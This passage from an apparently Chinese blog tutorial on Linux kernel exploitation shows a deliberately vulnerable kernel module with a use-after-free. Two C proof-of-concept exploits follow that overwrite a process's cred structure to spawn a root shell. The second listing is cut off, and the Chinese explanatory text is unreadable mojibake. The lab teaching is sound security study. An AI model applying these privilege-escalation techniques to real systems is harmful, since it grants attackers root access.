       printk(<span class="string">&quot;Kernel Edit function!---003\n&quot;</span>);</span><br><span class="line">            noteChunk = (struct Note*)arg;</span><br><span class="line">            <span class="keyword">if</span> (notelist[noteChunk-&gt;idx])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(notelist[noteChunk-&gt;idx], noteChunk-&gt;data,noteChunk-&gt;len);</span><br><span class="line">                printk(<span class="string">&quot;Edit Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                printk(<span class="string">&quot;You can&#x27;t edit it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//read   //over read</span></span><br><span class="line">            printk(<span class="string">&quot;Kernel Read function!---004\n&quot;</span>);</span><br><span class="line">            noteChunk = (struct Note*)arg;</span><br><span class="line">            <span class="keyword">if</span>(notelist[noteChunk-&gt;idx])&#123;</span><br><span class="line">                copy_to_user(noteChunk-&gt;data,notelist[noteChunk-&gt;idx],noteChunk-&gt;len);</span><br><span class="line">                printk(<span class="string">&quot;Read Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">111</span>: <span class="comment">//Test add chunk</span></span><br><span class="line">            printk(<span class="string">&quot;Test add chunk!---111\n&quot;</span>);</span><br><span class="line">            printk(KERN_INFO <span class="string">&quot;No buffer_var!Malloc now!&quot;</span> );</span><br><span class="line">            buffer_var=(<span class="keyword">char</span>*)kmalloc(<span class="number">0xa8</span>,GFP_KERNEL);</span><br><span class="line">            printk(<span class="string">&quot;buffer_var:0x%llx\n&quot;</span>,buffer_var);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            retval = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">stack_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module stack: open()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">stack_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    kfree(buffer_var);</span><br><span class="line">    <span class="comment">//buffer_var = NULL;</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module stack: close()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(stack_init);</span><br><span class="line">module_exit(stack_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">// MODULE_AUTHOR(&quot;blackndoor&quot;);</span></span><br><span class="line"><span class="comment">// MODULE_DESCRIPTION(&quot;Module vuln overflow&quot;);</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="ä¸€ã€åˆ©ç”¨Credç»“æ„ä½“ææƒ"   >
          <a href="#ä¸€ã€åˆ©ç”¨Credç»“æ„ä½“ææƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€åˆ©ç”¨Credç»“æ„ä½“ææƒ" class="headerlink" title="ä¸€ã€åˆ©ç”¨Credç»“æ„ä½“ææƒ"></a>ä¸€ã€åˆ©ç”¨Credç»“æ„ä½“ææƒ</h1>
      
        <h2 id="1-æ­£å¸¸UAF"   >
          <a href="#1-æ­£å¸¸UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ­£å¸¸UAF" class="headerlink" title="1.æ­£å¸¸UAF"></a>1.æ­£å¸¸UAF</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†"   >
          <a href="#å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      <p>ç”±äºæ˜¯UAFæ¼æ´ï¼Œæ‰€ä»¥ç›´æ¥å°è¯•å†é‡å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ ·æ–°è¿›ç¨‹å¯åŠ¨æ—¶å°±ä¼šç”³è¯·ä¸€ä¸ªCredç»“æ„ä½“(è¿™é‡Œå¤§å°ä¸º0xa8)ã€‚è€Œå¦‚æœæ­¤æ—¶ç”³è¯·çš„ç»“æ„ä½“æ°å¥½è½åœ¨æˆ‘ä»¬é‡Šæ”¾è¿‡çš„å †å—ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨UAFæ¼æ´ä¿®æ”¹Credç»“æ„ä½“ï¼Œå°†å…¶uidå’Œgidæ”¹ä¸º0ï¼Œå†åˆ©ç”¨è¯¥è¿›ç¨‹åŸåœ°èµ·shellï¼Œå°±èƒ½è·å¾—rootæƒé™çš„shelläº†ã€‚</p>
<p>è¿™é‡ŒåŒæ ·éœ€è¦ä¸€ç‚¹å‰ç½®çŸ¥è¯†ï¼Œä¹‹å‰ä¹Ÿå†™è¿‡ç±»ä¼¼çš„ï¼Œå…¶å®å°±ç›¸å½“äºä¿®æ”¹æŸä¸ªè¿›ç¨‹çš„credç»“æ„ä½“ä¸­çš„uidå’Œgidå°±èƒ½å°†è¯¥è¿›ç¨‹ææƒäº†ï¼Œä¹‹ååˆ©ç”¨ææƒåçš„è¿›ç¨‹èµ·shellå¾—åˆ°çš„shellå°±æ˜¯ææƒåçš„shellã€‚</p>
<p>æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œç›´æ¥ç»™</p>

        <h3 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">editNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFun</span><span class="params">(<span class="keyword">int</span> fd,struct addNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> idFork;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addNote</span> <span class="title">addChunk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">editNote</span> <span class="title">readChunk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">editNote</span> <span class="title">editChunk</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/stack&quot;</span>;</span><br><span class="line">    fd = openDev(pos);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addChunk.len = <span class="number">0xa8</span>;</span><br><span class="line">    addChunk.data = credBuf;</span><br><span class="line">    addFun(fd,&amp;addChunk);</span><br><span class="line">    </span><br><span class="line">    editChunk.idx = <span class="number">0</span>;</span><br><span class="line">    freeFun(fd,&amp;editChunk);</span><br><span class="line">    </span><br><span class="line">    idFork = fork();</span><br><span class="line">    editChunk.data = credBuf;</span><br><span class="line">    editChunk.len = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">        editFun(fd,&amp;editChunk);     </span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFun</span><span class="params">(<span class="keyword">int</span> fd, struct addNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">1</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">888</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">3</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">4</span>,arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œè¿˜éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œcredç»“æ„ä½“å¤§å°åœ¨æˆ‘ç¼–è¯‘çš„4.4.72ä¸­ä¸º0xa8ï¼Œåœ¨ä¸åŒå†…æ ¸ç‰ˆæœ¬å¯èƒ½ä¸åŒï¼Œé€šå¸¸å¯ä»¥æŸ¥çœ‹å¯¹åº”ç‰ˆæœ¬çš„Linuxå†…æ ¸æºç æˆ–è€…å†™ä¸ªç®€ä¾¿çš„Cç¨‹åºè¿è¡Œä¸€ä¸‹å³å¯çŸ¥é“ã€‚</p>

        <h2 id="2-ä¼ªæ¡ä»¶ç«äº‰é€ æˆçš„UAF-å¤šè¿›ç¨‹"   >
          <a href="#2-ä¼ªæ¡ä»¶ç«äº‰é€ æˆçš„UAF-å¤šè¿›ç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¼ªæ¡ä»¶ç«äº‰é€ æˆçš„UAF-å¤šè¿›ç¨‹" class="headerlink" title="2.ä¼ªæ¡ä»¶ç«äº‰é€ æˆçš„UAF(å¤šè¿›ç¨‹)"></a>2.ä¼ªæ¡ä»¶ç«äº‰é€ æˆçš„UAF(å¤šè¿›ç¨‹)</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†-1"   >
          <a href="#å‰ç½®çŸ¥è¯†-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†-1" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      <p>å‰é¢æˆ‘ä»¬çš„UAFæ˜¯æ­£å¸¸çš„æŒ‡é’ˆæœªç½®ç©ºçš„UAFï¼Œä½†å¦‚æœåœ¨ç¨‹åºä¸­æ˜¯addå‡½æ•°ç”³è¯·chunkï¼Œåªæœ‰åœ¨å…³é—­è®¾å¤‡æ—¶æ‰ä¼šé‡Šæ”¾chunkã€‚é‚£ä¹ˆè¿™æ ·å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªè®¾å¤‡è¿›è¡Œæ“ä½œæ—¶ï¼Œåªæœ‰åœ¨å…³é—­è®¾å¤‡æ—¶æ‰èƒ½é‡Šæ”¾chunkï¼Œè¿™å°±æ— æ³•æ˜¾è‘—åœ°é€ æˆUAFã€‚ä½†æ˜¯å¦‚æœèƒ½å¤Ÿå¯¹åŒä¸€ä¸ªè®¾å¤‡æ‰“å¼€ä¸¤æ¬¡  (æ“ä½œç¬¦åˆ†åˆ«ä¸ºfd1,fd2) ï¼Œç”³è¯·ä¸€ä¸ªå †å—åï¼Œå…³é—­æ‰ç¬¬ä¸€ä¸ªè®¾å¤‡fd1åï¼Œå°±èƒ½é‡Šæ”¾è¯¥å †å—ã€‚ä¹‹ååˆ©ç”¨fd2ç»§ç»­å¯¹è®¾å¤‡è¿›è¡Œå†™æ“ä½œï¼Œå°±èƒ½å¤Ÿç»§ç»­ä¿®æ”¹é‡Šæ”¾æ‰çš„å †å—äº†ï¼Œè¿™æ ·å°±é€ æˆäº†ä¸€ä¸ªUAFæ¼æ´ã€‚åŒæ ·ä¹Ÿæ˜¯åˆ©ç”¨credç»“æ„ä½“è¿›è¡Œææƒã€‚</p>
<p>åŒæ ·ç›´æ¥ç»™å‡ºpocå³å¯</p>

        <h3 id="POC-1"   >
          <a href="#POC-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">editNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFun</span><span class="params">(<span class="keyword">int</span> fd,struct addNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1,fd2;</span><br><span class="line">    <span class="keyword">int</span> idFork,idBefore;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addNote</span> <span class="title">addChunk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">editNote</span> <span class="title">readChunk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">editNote</span> <span class="title">editChunk</span>;</span></span><br><span class="line">    <span class="comment">//char *mycred;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//mycred = current_user_ns();</span></span><br><span class="line">    <span class="comment">//printf(&quot;Cred_addr:0x%llx\n&quot;,mycred);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/stack&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd1 = openDev(pos);</span><br><span class="line">    fd2 = openDev(pos);</span><br><span class="line">    ioctl(fd1,<span class="number">111</span>,editChunk); <span class="comment">//test add</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    </span><br><span class="line">    idFork = fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idFork:%d\n&quot;</span>,idFork);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">        idBefore = getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before uid:%d\n&quot;</span>,idBefore);</span><br><span class="line">        write(fd2, credBuf, <span class="number">28</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFun</span><span class="params">(<span class="keyword">int</span> fd, struct addNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">1</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">888</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* 